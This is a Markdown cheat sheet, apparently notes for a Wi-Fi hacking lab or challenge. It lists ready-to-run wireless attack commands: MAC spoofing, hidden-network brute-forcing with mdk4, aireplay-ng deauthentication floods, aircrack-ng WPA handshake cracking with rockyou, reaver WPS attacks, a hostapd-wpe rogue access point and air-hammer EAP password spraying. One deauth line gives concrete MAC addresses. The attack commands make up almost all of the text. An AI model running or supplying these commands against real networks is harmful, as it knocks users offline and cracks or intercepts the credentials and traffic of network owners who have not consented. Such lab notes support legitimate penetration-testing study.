# Table of contents

- [Enumeration](#enumeration)
- [Services](#services)

## Setup

change mac address
```bash
ip link set wlan0 down
macchanger –m [mac_to_set] wlan0
ip link set wlan0 up
```

setup wifi_db and run it
```bash
python3 wifi_db.py -d wifichallenge.db /home/user/wifi
sqlitebrowser wifichallenge.db
```

Connect to OPN (open) network
```
wpa_supplicant -Dnl80211 -iwlan0 -c opn.conf
dhclient wlan0 -v
```

## Enumeration

start monitor mode
```bash
airodump-ng start wlan0
```

scan all
```bash
airodump-ng wlan0 -b abg --wps
```

scan 5GHz network
```bash
airodump-ng wlan0 -b a
```

scan specific BBSID and write traffic to pcap
```bash
airodump-ng wlan0 -c [channel_id] --bssid [bssid] -w accesspoint.pcap
```

bruteforce to get hidden essid
```bash
airmon-ng start wlan0 1
mdk4 wlan0mon p -t [bssid] -f ~/rockyou.txt
```

find other clients in the same network
```bash
arp-scan -l -I wlan0
```


## WEP based deauth attack


Get hidden wifi
```bash
besside-ng -c [channel_id] -b [bssid] wlan1 -v
iwconfig wlan0mon channel 1 ### network is hidden, requires to probe it with correct ESSID
mdk4 wlan0mon p -t [bssid] -f ~/rockyou.txt
```

## WPA based deauth attack

airodump-ng wlan0mon -w wifi -c 1 --wps
aireplay-ng -0 0 -a [bssid] wlan0mon
aireplay-ng -0 0 -a [bssid] -c [client_mac] wlan0mon
aircrack-ng wifi-01.cap -w /path/to/rockyou.txt

sudo airodump-ng wlan0mon
sudo airodump-ng -c 3 -w wpa --essid [essid] --bssid [bssid] wlan0mon
sudo aireplay-ng -0 1 -a [bssid] -c [client_mac] wlan0mon
aircrack-ng -w /usr/share/john/password.lst -e [essid] -b [bssid] wpa-01.cap


## WPS

reaver -i wlan0 -b [bssid]

## EAP

Discover EAP supported by network
```bash
EAP_buster.sh [essid] [domain\username] [interface]
```

Discover EAP supported by network
```bash
EAP_buster.sh [essid] [domain\username] [interface]
```

alternative
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
After starting the RogueAP we disconnect the client
aireplay-ng -0 0 -a F0:9F:C2:71:22:55 wlan0mon -c 10:f9:6f:07:6c:00

bruteforce users from the given file (domain\username list)
air-hammer.py -i wlan0 -e [essid] -p ~/rockyou.txt -u [users_file]


## Post-exploitation

airdecap-ng -e [essid] -p [password] wifi-wpa-01.cap